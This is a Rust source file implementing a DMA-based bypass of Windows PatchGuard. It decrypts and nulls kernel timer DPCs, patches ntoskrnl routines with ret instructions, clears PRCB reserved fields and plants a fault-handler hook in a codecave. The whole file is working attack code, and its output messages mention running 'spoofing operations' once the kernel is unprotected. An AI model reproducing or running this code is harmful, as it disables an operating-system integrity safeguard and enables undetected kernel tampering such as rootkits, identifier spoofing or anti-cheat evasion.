use super::barricade::Barricade;
use super::offsets::*;
use crate::core::Dma;
use crate::utils::codecave::find_best_codecave;
use anyhow::{anyhow, Result};

pub struct PatchGuardBypass<'a> {
    dma: &'a Dma<'a>,
    ntoskrnl_base: u64,
    ki_wait_never: u64,
    ki_wait_always: u64,
    processor_count: u32,
}

impl<'a> PatchGuardBypass<'a> {
    pub fn new(dma: &'a Dma<'a>) -> Result<Self> {
        let ntoskrnl = dma.get_module(KERNEL_PID, "ntoskrnl.exe")?;
        let ntoskrnl_base = ntoskrnl.base;

        println!("    ntoskrnl.exe base: 0x{:X}", ntoskrnl_base);

        let ki_wait_never = dma.read_u64(KERNEL_PID, ntoskrnl_base + KI_WAIT_NEVER_OFF)?;
        let ki_wait_always = dma.read_u64(KERNEL_PID, ntoskrnl_base + KI_WAIT_ALWAYS_OFF)?;

        println!("    KiWaitNever: 0x{:016X}", ki_wait_never);
        println!("    KiWaitAlways: 0x{:016X}", ki_wait_always);

        let processor_count = Self::get_processor_count(dma, ntoskrnl_base)?;
        println!("    Processor count: {}", processor_count);

        Ok(Self {
            dma,
            ntoskrnl_base,
            ki_wait_never,
            ki_wait_always,
            processor_count,
        })
    }

    fn get_processor_count(dma: &Dma, ntoskrnl_base: u64) -> Result<u32> {
        let ki_processor_block = ntoskrnl_base + KI_PROCESSOR_BLOCK_OFF;
        let mut count = 0u32;

        for i in 0..256 {
            let prcb_ptr = dma.read_u64(KERNEL_PID, ki_processor_block + i * 8)?;
            if prcb_ptr == 0 {
                break;
            }
            count += 1;
        }

        Ok(count.max(1))
    }

    fn decrypt_dpc(&self, timer_addr: u64, encrypted_dpc: u64) -> u64 {
        let rotated = encrypted_dpc ^ self.ki_wait_never;
        let rotated = rotated.rotate_left((self.ki_wait_never & 0xFF) as u32);
        let xored = rotated ^ timer_addr;
        let swapped = xored.swap_bytes();
        swapped ^ self.ki_wait_always
    }

    fn encrypt_dpc(&self, timer_addr: u64, dpc_ptr: u64) -> u64 {
        let xored = dpc_ptr ^ self.ki_wait_always;
        let swapped = xored.swap_bytes();
        let xored2 = swapped ^ timer_addr;
        let rotated = xored2.rotate_right((self.ki_wait_never & 0xFF) as u32);
        rotated ^ self.ki_wait_never
    }

    fn is_canonical_address(addr: u64) -> bool {
        let high_bits = addr >> 47;
        high_bits == 0 || high_bits == 0x1FFFF
    }

    pub fn patch_ki_sw_interrupt_dispatch(&self) -> Result<()> {
        let target = self.ntoskrnl_base + KI_SW_INTERRUPT_DISPATCH_OFF;

        let patch: [u8; 2] = [0xC3, 0xCC];
        self.dma.write(KERNEL_PID, target, &patch)?;

        println!(
            "[+] Patched KiSwInterruptDispatch at 0x{:X} with ret",
            target
        );
        Ok(())
    }

    pub fn clear_max_data_size(&self) -> Result<()> {
        let target = self.ntoskrnl_base + MAX_DATA_SIZE_OFF;

        let zero: [u8; 8] = [0; 8];
        self.dma.write(KERNEL_PID, target, &zero)?;

        println!("[+] Cleared MaxDataSize at 0x{:X}", target);
        Ok(())
    }

    pub fn patch_ki_mca_deferred_recovery_service(&self) -> Result<()> {
        let target = self.ntoskrnl_base + KI_MCA_DEFERRED_RECOVERY_SERVICE_OFF;

        let patch: [u8; 2] = [0xC3, 0xCC];
        self.dma.write(KERNEL_PID, target, &patch)?;

        println!(
            "[+] Patched KiMcaDeferredRecoveryService at 0x{:X} with ret",
            target
        );
        Ok(())
    }

    pub fn disable_pg_timers(&self) -> Result<u32> {
        let ki_processor_block = self.ntoskrnl_base + KI_PROCESSOR_BLOCK_OFF;
        let cc_bcb_profiler = self.ntoskrnl_base + CC_BCB_PROFILER_OFF;
        let mut disabled_count = 0u32;

        for cpu in 0..self.processor_count {
            let prcb_ptr = self
                .dma
                .read_u64(KERNEL_PID, ki_processor_block + cpu as u64 * 8)?;
            if prcb_ptr == 0 {
                continue;
            }

            println!("    Scanning CPU {} PRCB at 0x{:X}", cpu, prcb_ptr);

            let timer_entries_base = prcb_ptr + PRCB_TIMER_TABLE_OFF + TIMER_TABLE_ENTRIES_OFF;

            for entry_idx in 0..TIMER_TABLE_ENTRY_COUNT {
                let entry_addr = timer_entries_base + (entry_idx as u64 * TIMER_TABLE_ENTRY_SIZE);

                let list_entry_addr = entry_addr + TIMER_TABLE_ENTRY_LIST_OFF;
                let flink = self.dma.read_u64(KERNEL_PID, list_entry_addr)?;

                if flink == list_entry_addr || flink == 0 {
                    continue;
                }

                let mut current_list_entry = flink;
                let mut iterations = 0;

                while current_list_entry != list_entry_addr
                    && current_list_entry != 0
                    && iterations < 100
                {
                    iterations += 1;

                    let timer_addr = current_list_entry - KTIMER_TIMER_LIST_ENTRY_OFF;

                    let encrypted_dpc =
                        self.dma.read_u64(KERNEL_PID, timer_addr + KTIMER_DPC_OFF)?;

                    if encrypted_dpc != 0 {
                        let dpc_ptr = self.decrypt_dpc(timer_addr, encrypted_dpc);

                        if dpc_ptr != 0 && Self::is_canonical_address(dpc_ptr) {
                            let deferred_context = self
                                .dma
                                .read_u64(KERNEL_PID, dpc_ptr + KDPC_DEFERRED_CONTEXT_OFF)?;
                            let deferred_routine = self
                                .dma
                                .read_u64(KERNEL_PID, dpc_ptr + KDPC_DEFERRED_ROUTINE_OFF)?;

                            let is_pg_timer = !Self::is_canonical_address(deferred_context)
                                || deferred_routine == cc_bcb_profiler;

                            if is_pg_timer {
                                println!(
                                    "      [!] Found PG timer at 0x{:X}, DPC=0x{:X}",
                                    timer_addr, dpc_ptr
                                );

                                let null_encrypted = self.encrypt_dpc(timer_addr, 0);
                                self.dma.write(
                                    KERNEL_PID,
                                    timer_addr + KTIMER_DPC_OFF,
                                    &null_encrypted.to_le_bytes(),
                                )?;

                                disabled_count += 1;
                            }
                        }
                    }

                    current_list_entry = self
                        .dma
                        .read_u64(KERNEL_PID, current_list_entry + LIST_ENTRY_FLINK_OFF)?;
                }
            }

            let hal_reserved_7 = prcb_ptr + PRCB_HAL_RESERVED_OFF + (7 * 8);
            let hal_val = self.dma.read_u64(KERNEL_PID, hal_reserved_7)?;
            if hal_val != 0 {
                println!("      [!] Clearing HalReserved[7] = 0x{:X}", hal_val);
                self.dma
                    .write(KERNEL_PID, hal_reserved_7, &0u64.to_le_bytes())?;
                disabled_count += 1;
            }

            let acpi_reserved = prcb_ptr + PRCB_ACPI_RESERVED_OFF;
            let acpi_val = self.dma.read_u64(KERNEL_PID, acpi_reserved)?;
            if acpi_val != 0 {
                println!("      [!] Clearing AcpiReserved = 0x{:X}", acpi_val);
                self.dma
                    .write(KERNEL_PID, acpi_reserved, &0u64.to_le_bytes())?;
                disabled_count += 1;
            }
        }

        Ok(disabled_count)
    }

    pub fn restore_balance_set_manager_dpc(&self) -> Result<()> {
        let dpc_addr = self.ntoskrnl_base + KI_BALANCE_SET_MANAGER_PERIODIC_DPC_OFF;
        let original_routine = self.ntoskrnl_base + KI_BALANCE_SET_MANAGER_DEFERRED_ROUTINE_OFF;

        self.dma.write(
            KERNEL_PID,
            dpc_addr + KDPC_DEFERRED_ROUTINE_OFF,
            &original_routine.to_le_bytes(),
        )?;

        println!("[+] Restored KiBalanceSetManagerPeriodicDpc deferred routine");
        Ok(())
    }

    pub fn bypass(&self) -> Result<()> {
        println!("\n[*] Starting PatchGuard bypass...\n");

        println!("[1] Disabling PatchGuard timers...");
        let disabled = self.disable_pg_timers()?;
        println!("    Disabled {} PatchGuard timers/DPCs\n", disabled);

        println!("[2] Restoring KiBalanceSetManagerPeriodicDpc...");
        self.restore_balance_set_manager_dpc()?;

        println!("\n[3] Patching KiSwInterruptDispatch...");
        self.patch_ki_sw_interrupt_dispatch()?;

        println!("\n[4] Patching KiMcaDeferredRecoveryService...");
        self.patch_ki_mca_deferred_recovery_service()?;

        println!("\n[5] Clearing MaxDataSize...");
        self.clear_max_data_size()?;

        println!("\n[+] PatchGuard bypass complete!");
        println!("    You can now safely modify kernel structures.");

        Ok(())
    }

    /// WARNING: Barricade is currently in PASSTHROUGH mode because:
    pub fn bypass_with_barricade(&self) -> Result<()> {
        self.bypass()?;

        println!("\n[6] Setting up Barricade (MmAccessFault hook)...");
        println!("    WARNING: Barricade is in PASSTHROUGH mode (no active PG detection)");
        println!("    NX flipping not implemented - hook only monitors, doesn't block");

        let codecave = find_best_codecave(self.dma.vmm(), 512)?;
        println!(
            "    Found codecave in {} at 0x{:X} ({} bytes)",
            codecave.module_name, codecave.address, codecave.size
        );

        if codecave.size < 512 {
            return Err(anyhow!(
                "Codecave too small for barricade (need 512 bytes, got {})",
                codecave.size
            ));
        }

        let mut barricade = Barricade::new(self.dma, codecave.address, codecave.size)?;
        barricade.setup()?;

        std::mem::forget(barricade);

        println!("\n[+] PatchGuard bypass complete (barricade in passthrough mode)");
        println!("    Basic bypass steps 1-5 are ACTIVE and should block most PG contexts.");
        println!("    Test by running spoofing operations and monitoring for BSOD.");

        Ok(())
    }
}
